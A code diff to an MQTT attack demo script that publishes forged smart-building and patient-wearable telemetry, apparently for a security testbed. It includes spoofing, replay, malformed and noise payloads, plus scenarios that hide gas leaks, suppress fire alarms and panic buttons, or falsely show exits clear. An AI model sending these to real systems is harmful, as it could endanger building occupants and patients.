@@ -16,186 +16,248 @@ import paho.mqtt.publish as publish
 SCENARIOS = {
     "building": {
         "description": "Smart Building telemetry",
-        "topics": {
-            "temperature": "building/temperature",
-            "humidity": "building/humidity",
-            "air_quality": "building/air_quality",
-            "occupancy": "building/occupancy",
-            "fire_alarm": "building/fire_alarm",
-            "gas_leak": "building/gas_leak",
-            "node_01_temperature": "building/nodes/node-01/temperature",
-            "node_01_fire_alarm": "building/nodes/node-01/fire_alarm",
-            "node_01_occupancy": "building/nodes/node-01/occupancy",
-            "node_01_gas_leak": "building/nodes/node-01/gas_leak",
-            "node_02_humidity": "building/nodes/node-02/humidity",
-            "node_02_air_quality": "building/nodes/node-02/air_quality",
-            "node_03_smoke": "building/nodes/node-03/smoke",
-            "node_03_exit_status": "building/nodes/node-03/exit_status",
-            "node_03_sprinkler_status": "building/nodes/node-03/sprinkler_status",
-            "node_04_temperature": "building/nodes/node-04/temperature",
-            "node_04_air_quality": "building/nodes/node-04/air_quality",
-            "node_04_occupancy": "building/nodes/node-04/occupancy",
-            "node_04_gas_leak": "building/nodes/node-04/gas_leak",
+        "components": {
+            "node-01": {
+                "label": "Room 101",
+                "topic_prefix": "building/nodes/node-01",
+                "generic_prefix": "building",
+                "fields": {
+                    "temperature": "temperature",
+                    "fire_alarm": "fire_alarm",
+                    "occupancy": "occupancy",
+                    "gas_leak": "gas_leak",
+                },
+            },
+            "node-02": {
+                "label": "Plant Room",
+                "topic_prefix": "building/nodes/node-02",
+                "generic_prefix": "building",
+                "fields": {
+                    "humidity": "humidity",
+                    "air_quality": "air_quality",
+                    "smoke": "smoke",
+                    "co2": "co2",
+                },
+            },
+            "node-03": {
+                "label": "Server Room",
+                "topic_prefix": "building/nodes/node-03",
+                "generic_prefix": "building",
+                "fields": {
+                    "temperature": "temperature",
+                    "smoke": "smoke",
+                    "sprinkler_status": "sprinkler_status",
+                    "exit_status": "exit_status",
+                },
+            },
+            "node-04": {
+                "label": "Workshop",
+                "topic_prefix": "building/nodes/node-04",
+                "generic_prefix": "building",
+                "fields": {
+                    "temperature": "temperature",
+                    "air_quality": "air_quality",
+                    "occupancy": "occupancy",
+                    "gas_leak": "gas_leak",
+                },
+            },
         },
-        "spoofed": {
-            "temperature": "23.40",
-            "humidity": "41.20",
-            "air_quality": "620",
-            "occupancy": "Occupied",
-            "fire_alarm": "Normal",
-            "gas_leak": "Normal",
-            "node_01_temperature": "23.40",
-            "node_01_fire_alarm": "Normal",
-            "node_01_occupancy": "Occupied",
-            "node_01_gas_leak": "Normal",
-        },
-        "extreme": {
-            "temperature": "85.00",
-            "humidity": "5.00",
-            "air_quality": "5000",
-            "occupancy": "Occupied",
-            "fire_alarm": "Fire detected",
-            "gas_leak": "Gas detected",
-            "node_01_temperature": "85.00",
-            "node_01_fire_alarm": "Fire detected",
-            "node_01_occupancy": "Occupied",
-            "node_01_gas_leak": "Gas detected",
-            "node_02_humidity": "5.00",
-            "node_02_air_quality": "5000",
-            "node_04_temperature": "85.00",
-            "node_04_air_quality": "5000",
-            "node_04_occupancy": "Occupied",
-            "node_04_gas_leak": "Gas detected",
-        },
-        "replay": {
-            "temperature": "21.10",
-            "humidity": "46.00",
-            "air_quality": "590",
-            "occupancy": "Vacant",
-            "fire_alarm": "Normal",
-            "gas_leak": "Normal",
-            "node_01_temperature": "21.10",
-            "node_01_fire_alarm": "Normal",
-            "node_01_occupancy": "Vacant",
-            "node_01_gas_leak": "Normal",
-        },
-        "malformed": {
-            "temperature": "not-a-temperature",
-            "humidity": '{"unexpected":"json"}',
-            "air_quality": "-999",
-            "occupancy": "",
-            "fire_alarm": "???",
-            "gas_leak": "",
-            "node_01_temperature": "not-a-temperature",
-            "node_01_fire_alarm": "???",
-            "node_01_occupancy": "",
-            "node_01_gas_leak": "",
-        },
-        "gas-leak-hidden": {
-            "node_01_gas_leak": "Normal",
-            "node_01_occupancy": "Occupied",
-            "node_01_temperature": "23.10",
-        },
-        "fire-alarm-suppressed": {
-            "node_01_fire_alarm": "Normal",
-            "node_01_occupancy": "Occupied",
-            "node_01_temperature": "72.50",
-        },
-        "blocked-exit-hidden": {
-            "node_03_smoke": "Smoke detected",
-            "node_03_exit_status": "Clear",
-            "node_03_sprinkler_status": "Standby",
+        "attacks": {
+            "spoofed": {
+                "purpose": "Plausible but false room states from trusted-looking node topics.",
+                "payloads": [
+                    ("node-01", "occupancy", "Occupied"),
+                    ("node-01", "gas_leak", "Gas detected"),
+                    ("node-02", "air_quality", "1800"),
+                    ("node-02", "smoke", "Smoke detected"),
+                    ("node-04", "occupancy", "Occupied"),
+                    ("node-04", "gas_leak", "Gas detected"),
+                ],
+            },
+            "extreme": {
+                "purpose": "Manipulated unsafe readings across multiple appropriate rooms.",
+                "payloads": [
+                    ("node-01", "temperature", "85.00"),
+                    ("node-01", "fire_alarm", "Fire detected"),
+                    ("node-01", "gas_leak", "Gas detected"),
+                    ("node-02", "humidity", "5.00"),
+                    ("node-02", "air_quality", "5000"),
+                    ("node-02", "co2", "High CO2"),
+                    ("node-03", "temperature", "78.00"),
+                    ("node-03", "smoke", "Smoke detected"),
+                    ("node-03", "sprinkler_status", "Disabled"),
+                    ("node-03", "exit_status", "Blocked"),
+                    ("node-04", "temperature", "82.00"),
+                    ("node-04", "gas_leak", "Gas detected"),
+                ],
+            },
+            "replay": {
+                "purpose": "Repeated stale but plausible Smart Building values.",
+                "payloads": [
+                    ("node-01", "temperature", "20.10"),
+                    ("node-01", "fire_alarm", "Normal"),
+                    ("node-01", "occupancy", "Vacant"),
+                    ("node-01", "gas_leak", "Normal"),
+                    ("node-02", "humidity", "44.00"),
+                    ("node-02", "air_quality", "610"),
+                    ("node-02", "smoke", "Clear"),
+                    ("node-03", "temperature", "21.30"),
+                    ("node-03", "smoke", "Clear"),
+                    ("node-03", "sprinkler_status", "Standby"),
+                    ("node-03", "exit_status", "Clear"),
+                ],
+            },
+            "malformed": {
+                "purpose": "Unexpected scalar values that the dashboard can receive but cannot interpret cleanly.",
+                "payloads": [
+                    ("node-01", "temperature", "not-a-temperature"),
+                    ("node-01", "fire_alarm", "???"),
+                    ("node-02", "humidity", '{"unexpected":"json"}'),
+                    ("node-02", "air_quality", "-999"),
+                    ("node-03", "sprinkler_status", "maybe"),
+                    ("node-04", "occupancy", ""),
+                ],
+            },
+            "noise": {
+                "purpose": "Bounded noisy telemetry bursts that compete with normal updates without stopping publishers.",
+                "payloads": [
+                    ("node-01", "occupancy", "Occupied"),
+                    ("node-01", "occupancy", "Vacant"),
+                    ("node-02", "air_quality", "880"),
+                    ("node-02", "air_quality", "1180"),
+                    ("node-04", "occupancy", "Occupied"),
+                    ("node-04", "occupancy", "Vacant"),
+                ],
+            },
+            "gas-leak-hidden": {
+                "purpose": "Safety case: occupancy is present while gas status is falsely reassuring.",
+                "payloads": [
+                    ("node-01", "occupancy", "Occupied"),
+                    ("node-01", "temperature", "24.20"),
+                    ("node-01", "gas_leak", "Normal"),
+                ],
+            },
+            "fire-alarm-suppressed": {
+                "purpose": "Safety case: unsafe heat while the fire alarm remains normal.",
+                "payloads": [
+                    ("node-01", "temperature", "72.50"),
+                    ("node-01", "occupancy", "Occupied"),
+                    ("node-01", "fire_alarm", "Normal"),
+                ],
+            },
+            "blocked-exit-hidden": {
+                "purpose": "Safety case: smoke in the Server Room while response systems look safe.",
+                "payloads": [
+                    ("node-03", "smoke", "Smoke detected"),
+                    ("node-03", "exit_status", "Clear"),
+                    ("node-03", "sprinkler_status", "Standby"),
+                ],
+            },
         },
     },
     "medical": {
         "description": "Medical wearable telemetry",
-        "topics": {
-            "heart_rate": "patient/vitals/heart_rate",
-            "spo2": "patient/vitals/spo2",
-            "blood_pressure": "patient/vitals/blood_pressure",
-            "patient_01_heart_rate": "patient/patient-01/vitals/heart_rate",
-            "patient_01_spo2": "patient/patient-01/vitals/spo2",
-            "patient_01_blood_pressure": "patient/patient-01/vitals/blood_pressure",
-            "fall_alert": "patient/patient-01/alerts/fall_alert",
-            "panic_button": "patient/patient-01/alerts/panic_button",
-            "battery_status": "patient/patient-01/alerts/battery_status",
+        "components": {
+            "patient-01": {
+                "label": "Patient 01",
+                "topic_prefix": "patient/patient-01",
+                "aggregate_prefix": "patient/vitals",
+                "fields": {
+                    "heart_rate": "vitals/heart_rate",
+                    "spo2": "vitals/spo2",
+                    "blood_pressure": "vitals/blood_pressure",
+                    "fall_alert": "alerts/fall_alert",
+                    "panic_button": "alerts/panic_button",
+                    "battery_status": "alerts/battery_status",
+                    "wearable_link": "alerts/wearable_link",
+                },
+                "aggregate_fields": {"heart_rate", "spo2", "blood_pressure"},
+            },
         },
-        "spoofed": {
-            "heart_rate": "78",
-            "spo2": "98",
-            "blood_pressure": "122/78",
-            "patient_01_heart_rate": "78",
-            "patient_01_spo2": "98",
-            "patient_01_blood_pressure": "122/78",
-            "fall_alert": "No fall",
-            "panic_button": "Not pressed",
-            "battery_status": "Normal",
-        },
-        "extreme": {
-            "heart_rate": "145",
-            "spo2": "82",
-            "blood_pressure": "190/120",
-            "patient_01_heart_rate": "145",
-            "patient_01_spo2": "82",
-            "patient_01_blood_pressure": "190/120",
-            "fall_alert": "Fall detected",
-            "panic_button": "Pressed",
-            "battery_status": "Battery critical",
-        },
-        "replay": {
-            "heart_rate": "67",
-            "spo2": "99",
-            "blood_pressure": "118/76",
-            "patient_01_heart_rate": "67",
-            "patient_01_spo2": "99",
-            "patient_01_blood_pressure": "118/76",
-            "fall_alert": "No fall",
-            "panic_button": "Not pressed",
-            "battery_status": "Normal",
-        },
-        "malformed": {
-            "heart_rate": "fast",
-            "spo2": "NaN",
-            "blood_pressure": "broken",
-            "patient_01_heart_rate": "fast",
-            "patient_01_spo2": "NaN",
-            "patient_01_blood_pressure": "broken",
-            "fall_alert": "unknown",
-            "panic_button": "maybe",
-            "battery_status": "",
-        },
-        "fall-alert-suppressed": {
-            "heart_rate": "112",
-            "spo2": "93",
-            "blood_pressure": "148/96",
-            "patient_01_heart_rate": "112",
-            "patient_01_spo2": "93",
-            "patient_01_blood_pressure": "148/96",
-            "fall_alert": "No fall",
-            "panic_button": "Not pressed",
-            "battery_status": "Normal",
-        },
-        "battery-falsely-normal": {
-            "heart_rate": "76",
-            "spo2": "98",
-            "blood_pressure": "122/78",
-            "patient_01_heart_rate": "76",
-            "patient_01_spo2": "98",
-            "patient_01_blood_pressure": "122/78",
-            "fall_alert": "No fall",
-            "panic_button": "Not pressed",
-            "battery_status": "Normal",
-        },
-        "panic-button-suppressed": {
-            "heart_rate": "132",
-            "spo2": "91",
-            "blood_pressure": "176/110",
-            "patient_01_heart_rate": "132",
-            "patient_01_spo2": "91",
-            "patient_01_blood_pressure": "176/110",
-            "fall_alert": "No fall",
-            "panic_button": "Not pressed",
-            "battery_status": "Normal",
+        "attacks": {
+            "spoofed": {
+                "purpose": "Plausible false patient state that creates a false emergency.",
+                "payloads": [
+                    ("patient-01", "heart_rate", "96"),
+                    ("patient-01", "spo2", "95"),
+                    ("patient-01", "blood_pressure", "138/88"),
+                    ("patient-01", "fall_alert", "Fall detected"),
+                    ("patient-01", "panic_button", "Not pressed"),
+                    ("patient-01", "battery_status", "Normal"),
+                ],
+            },
+            "extreme": {
+                "purpose": "Unsafe and physiologically concerning vital signs.",
+                "payloads": [
+                    ("patient-01", "heart_rate", "145"),
+                    ("patient-01", "spo2", "82"),
+                    ("patient-01", "blood_pressure", "190/120"),
+                    ("patient-01", "fall_alert", "Fall detected"),
+                    ("patient-01", "panic_button", "Pressed"),
+                    ("patient-01", "battery_status", "Battery critical"),
+                ],
+            },
+            "replay": {
+                "purpose": "Repeated stale but plausible patient readings.",
+                "payloads": [
+                    ("patient-01", "heart_rate", "67"),
+                    ("patient-01", "spo2", "99"),
+                    ("patient-01", "blood_pressure", "118/76"),
+                    ("patient-01", "fall_alert", "No fall"),
+                    ("patient-01", "panic_button", "Not pressed"),
+                    ("patient-01", "battery_status", "Normal"),
+                ],
+            },
+            "malformed": {
+                "purpose": "Unexpected patient payload formats that classify as unknown or ambiguous.",
+                "payloads": [
+                    ("patient-01", "heart_rate", "fast"),
+                    ("patient-01", "spo2", "NaN"),
+                    ("patient-01", "blood_pressure", "broken"),
+                    ("patient-01", "fall_alert", "unknown"),
+                    ("patient-01", "panic_button", "maybe"),
+                    ("patient-01", "battery_status", ""),
+                ],
+            },
+            "noise": {
+                "purpose": "Bounded competing patient updates without stopping the live gateway.",
+                "payloads": [
+                    ("patient-01", "heart_rate", "74"),
+                    ("patient-01", "heart_rate", "104"),
+                    ("patient-01", "spo2", "97"),
+                    ("patient-01", "spo2", "94"),
+                    ("patient-01", "wearable_link", "Disconnected"),
+                    ("patient-01", "wearable_link", "Connected"),
+                ],
+            },
+            "fall-alert-suppressed": {
+                "purpose": "Safety case: deteriorating vitals while fall status remains falsely normal.",
+                "payloads": [
+                    ("patient-01", "heart_rate", "112"),
+                    ("patient-01", "spo2", "93"),
+                    ("patient-01", "blood_pressure", "148/96"),
+                    ("patient-01", "fall_alert", "No fall"),
+                ],
+            },
+            "battery-falsely-normal": {
+                "purpose": "Safety case: wearable link reliability risk while battery appears normal.",
+                "payloads": [
+                    ("patient-01", "heart_rate", "76"),
+                    ("patient-01", "spo2", "98"),
+                    ("patient-01", "blood_pressure", "122/78"),
+                    ("patient-01", "wearable_link", "Disconnected"),
+                    ("patient-01", "battery_status", "Normal"),
+                ],
+            },
+            "panic-button-suppressed": {
+                "purpose": "Safety case: unsafe vitals while the panic button remains falsely unpressed.",
+                "payloads": [
+                    ("patient-01", "heart_rate", "132"),
+                    ("patient-01", "spo2", "91"),
+                    ("patient-01", "blood_pressure", "176/110"),
+                    ("patient-01", "panic_button", "Not pressed"),
+                ],
+            },
         },
     },
 }
@@ -203,16 +265,34 @@ SCENARIO_ALIASES = {}
 
 
 ATTACKS = tuple(
-    sorted({attack for profile in SCENARIOS.values() for attack in profile if attack not in ("description", "topics")})
-    + ["noise"]
+    sorted({attack for profile in SCENARIOS.values() for attack in profile["attacks"]})
 )
 
 
-def publish_payloads(host, port, topics, payloads, delay):
-    for name, payload in payloads.items():
-        topic = topics[name]
-        print(f"{topic} <- {payload}")
+def event_topics(component, field):
+    field_topic = component["fields"][field]
+    topics = [f"{component['topic_prefix']}/{field_topic}"]
+    if field in component.get("aggregate_fields", set()):
+        topics.append(f"{component['aggregate_prefix']}/{field}")
+    elif component.get("generic_prefix"):
+        topics.append(f"{component['generic_prefix']}/{field}")
+    return topics
+
+
+def publish_event(host, port, component_id, component, field, payload):
+    label = component["label"]
+    print(f"{label} ({component_id}): {field} <- {payload}")
+    for topic in event_topics(component, field):
+        print(f"  {topic} <- {payload}")
         publish.single(topic, payload, hostname=host, port=port)
+
+
+def publish_payloads(host, port, components, payloads, delay):
+    for component_id, field, payload in payloads:
+        component = components[component_id]
+        if field not in component["fields"]:
+            raise SystemExit(f"Attack references unsupported field {component_id}.{field}.")
+        publish_event(host, port, component_id, component, field, payload)
         if delay:
             time.sleep(delay)
 
@@ -220,31 +300,27 @@ def publish_payloads(host, port, topics, payloads, delay):
 def run_attack(args):
     scenario = SCENARIO_ALIASES.get(args.scenario, args.scenario)
     profile = SCENARIOS[scenario]
-    topics = profile["topics"]
+    attack = profile["attacks"][args.attack]
+    components = profile["components"]
+    payloads = attack["payloads"]
 
     print(f"SISEN MQTT attack demo: {args.attack}")
     print(f"Scenario: {args.scenario} ({profile['description']})")
+    print(f"Purpose: {attack['purpose']}")
     print(f"Broker: {args.host}:{args.port}")
     print()
 
     if args.attack == "noise":
-        if "spoofed" not in profile:
-            raise SystemExit(f"Noise attack is not defined for scenario {scenario}.")
-        payloads = profile["spoofed"]
         for index in range(args.count):
             print(f"Noise burst {index + 1}/{args.count}")
-            publish_payloads(args.host, args.port, topics, payloads, args.delay)
+            publish_payloads(args.host, args.port, components, payloads, args.delay)
         return
 
-    if args.attack not in profile:
-        raise SystemExit(f"Attack {args.attack} is not defined for scenario {scenario}.")
-
-    payloads = profile[args.attack]
     if args.attack == "replay":
         for index in range(args.count):
             if args.count > 1:
                 print(f"Replay {index + 1}/{args.count}")
-            publish_payloads(args.host, args.port, topics, payloads, args.delay)
+            publish_payloads(args.host, args.port, components, payloads, args.delay)
         return
 
     deadline = time.monotonic() + args.duration if args.duration > 0 else None
@@ -253,7 +329,7 @@ def run_attack(args):
         published += 1
         if published > 1:
             print(f"Refresh {published}")
-        publish_payloads(args.host, args.port, topics, payloads, args.delay)
+        publish_payloads(args.host, args.port, components, payloads, args.delay)
         if deadline is None or time.monotonic() >= deadline:
             break
 
